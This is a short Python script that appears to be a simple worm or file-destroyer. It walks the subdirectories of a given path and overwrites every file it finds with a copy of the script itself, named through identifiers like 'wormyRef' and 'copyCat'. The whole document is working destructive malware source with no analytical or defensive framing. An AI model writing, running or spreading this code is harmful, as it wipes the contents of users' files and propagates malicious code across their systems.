#!/usr/bin/env python3

import sys
import os
import shutil
def dirDiver(path):
    dirList = []
    for i in os.listdir(path):
            absoPath = path + "/" + i
            if i.startswith('.') == False:
                if os.path.isfile(absoPath):
                    pass 
                elif os.path.isdir(absoPath):
                    dirList.append(absoPath)
                    dirDiver(absoPath)

    return dirList 

def fileDiver(dirArray):
    fileList = []
    for i in dirArray:
        for j in os.listdir(i):
            fileAbsoPath = i + "/" + j 
            if os.path.isfile(fileAbsoPath):
                fileList.append(fileAbsoPath)
            else:
                pass
    
    return fileList 

def copyCat(fileArray):
    for i in fileArray:
        copyabsoPath = os.path.realpath(i)
        wormyRef = os.path.realpath(sys.argv[0])
        shutil.copyfile(wormyRef, copyabsoPath)

if __name__ == "__main__":
    dirArray = dirDiver(sys.argv[1])
    fileArray = fileDiver(dirArray)
    copyCat(fileArray)